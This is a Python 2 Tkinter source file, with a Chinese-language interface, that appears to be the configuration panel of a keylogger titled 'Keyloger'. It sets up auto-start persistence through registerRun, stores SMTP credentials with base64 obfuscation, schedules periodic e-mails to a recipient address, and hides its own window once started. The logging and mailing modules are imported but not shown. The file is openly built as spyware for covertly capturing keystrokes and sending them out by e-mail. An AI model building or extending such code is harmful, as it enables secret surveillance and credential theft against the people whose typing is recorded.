#!/usr/bin/python
# -*- coding: UTF-8 -*-
import re
from Tkinter import *
from tkMessageBox import showinfo
import ConfigParser
import base64
import keyloger
import threading
import keylogerV1

config = ConfigParser.ConfigParser()
with open('config.cfg', 'r') as cfgfile:
    config.readfp(cfgfile)


def getproperties(type, name):
    return config.get(type, name)
def saveproperties(type, name, value):
    config.set(type, name, value)
cfg_hasemail = getproperties('email', 'hasemail')
cfg_from_addr = getproperties('email', 'from_addr')
try:
    cfg_password = base64.b64decode(getproperties('email', 'password'))
except Exception,e:
    cfg_password = getproperties('email', 'password')
cfg_to_addr = getproperties('email', 'to_addr')
cfg_smtp_server = getproperties('email', 'smtp_server')
cfg_hour = getproperties('time', 'hour')
cfg_minute = getproperties('time', 'minute')
cfg_day = getproperties('time', 'day')
cfg_autostart = getproperties('autostart', 'autostart')


class App: 
    def __init__(self, master):  
        #构造函数里传入一个父组件(master),创建一个Frame组件并显示
        self.root = master
        self.root.title('Keyloger')
        self.root.iconbitmap('Application.ico')
        frame = Frame(master)
        frame.grid()

        label1 = Label(frame)
        label1['text'] = '开机启动 :'
        label1.grid(row=0, column=0)
        global isAutoStart
        isAutoStart = IntVar()
        isAutoStart.set(int(cfg_autostart))
        R1 = Radiobutton(frame, text="是", variable=isAutoStart, value=1)
        R2 = Radiobutton(frame, text="否", variable=isAutoStart, value=0)
        R1.grid(row=0, column=1)
        R2.grid(row=0, column=2)
        
        label9 = Label(frame)
        label9['text'] = '是否配置邮箱 :'
        label9.grid(row=1, column=0)
        global hasemail
        hasemail = IntVar()
        hasemail.set(int(cfg_hasemail))
        R3 = Radiobutton(frame, text="是", variable=hasemail, value=1)
        R4 = Radiobutton(frame, text="否", variable=hasemail, value=0)
        R3.grid(row=1, column=1)
        R4.grid(row=1, column=2)

        label2 = Label(frame)
        label2['text'] = '邮箱设置 :'
        label2.grid(row=2, column=0)
        label3 = Label(frame)
        label3['text'] = '发件邮箱'
        label3.grid(row=3, column=0)
        global from_addr
        from_addr = StringVar()
        from_addr.set(cfg_from_addr) 
        from_addr_entry = Entry(frame,textvariable = from_addr) 
        from_addr_entry.grid(row=3, column=1)

        label4 = Label(frame)
        label4['text'] = '发件邮箱密码'
        label4.grid(row=3, column=2)
        global password
        password = StringVar() 
        password.set(cfg_password)
        password_entry = Entry(frame,textvariable = password, show='*') 
        password_entry.grid(row=3, column=3)

        label5 = Label(frame)
        label5['text'] = '收件邮箱'
        label5.grid(row=4, column=0)
        global to_addr
        to_addr = StringVar() 
        to_addr.set(cfg_to_addr)
        to_addr_entry = Entry(frame,textvariable = to_addr) 
        to_addr_entry.grid(row=4, column=1)

        label6 = Label(frame)
        label6['text'] = '发件邮箱服务器'
        label6.grid(row=4, column=2)
        global smtp_server
        smtp_server = StringVar() 
        smtp_server.set(cfg_smtp_server)
        smtp_server_entry = Entry(frame,textvariable = smtp_server) 
        smtp_server_entry.grid(row=4, column=3)

        label7 = Label(frame)
        label7['text'] = '周期时间设置 :'
        label7.grid(row=5, column=0)
        label8 = Label(frame)
        label8['text'] = '时'
        label8.grid(row=6, column=0)
        global hour
        hour = StringVar() 
        hour.set(cfg_hour)
        hour_entry = Entry(frame, textvariable = hour)
        hour_entry.grid(row=6, column=1)
        
        label8 = Label(frame)
        label8['text'] = '分'
        label8.grid(row=7, column=0)
        global minute
        minute = StringVar() 
        minute.set(cfg_minute)
        minute_entry = Entry(frame,textvariable = minute) 
        minute_entry.grid(row=7, column=1)
        
        label8 = Label(frame)
        label8['text'] = '间隔(天)'
        label8.grid(row=8, column=0)

        global day 
        day = StringVar() 
        day.set(cfg_day)
        day_entry = Entry(frame,textvariable = day) 
        day_entry.grid(row=8, column=1)

        beginBtn = Button(frame, text="开始", command=self.start)  
        beginBtn.grid(row=9, column=1) 
        exitBtn = Button(frame, text="退出", command=self.exit)  
        exitBtn.grid(row=9, column=2) 
    
    
    def exit(self):
        self.root.destroy()

    def start(self):
        self.__save_cfg()
        if isAutoStart.get() == 1:
            keyloger.registerRun()
        ''' threads =[]
        threads.append(threading.currentThread())
        t = threading.Thread(keyloger.loger_start())
        t.setDaemon(True)
        t.start()
        t.join() '''
        email=EmailClass()
        email.start()
        self.root.withdraw()

    #运行时隐藏窗口   
    def hide(self):
        self.root.withdraw()
    #保存参数到配置文件
    def __save_cfg(self):
        if hasemail.get() == 0 :
            saveproperties('email', 'hasemail', '0')
        else:
            if re.match('^[0-9]+$', str(day.get() + hour.get() + minute.get())) == None:
                if not day.get().isdigit():
                    day.set(re.sub(r'\D', "", day.get()))
                if not minute.get().isdigit():
                    minute.set(re.sub(r'\D', "", minute.get()))
                if not hour.get().isdigit(): 
                    hour.set(re.sub(r'\D', "", hour.get()))
                showinfo('提示', '时间设置请输入正确数字')
                return
            if int(hour.get())>24 or int(hour.get())<0 or int(minute.get())>60 or int(minute.get())<0:
                showinfo('提示', '时间设置错误')
                return
            saveproperties('email', 'hasemail', '1')
            if from_addr.get() != cfg_from_addr:
                saveproperties('email', 'from_addr', from_addr.get())
            if password.get() != cfg_password:
                saveproperties('email', 'password', base64.b64encode(password.get()))
            if to_addr.get() != cfg_to_addr:
                saveproperties('email', 'to_addr', to_addr.get())
            if smtp_server.get() != cfg_smtp_server:
                saveproperties('email','smtp_server', smtp_server.get())
            if hour.get() != cfg_hour:
                saveproperties('time', 'hour', hour.get())
            if minute.get() != cfg_minute:
                saveproperties('time', 'minute', minute.get())
            if day.get() != cfg_day:
                saveproperties('time', 'day', day.get())
            if isAutoStart.get() != int(cfg_autostart):
                saveproperties('autostart', 'autostart', str(isAutoStart.get())) 
        config.write(open('config.cfg', 'w'))
  
win = Tk() 
app = App(win)  
win.mainloop()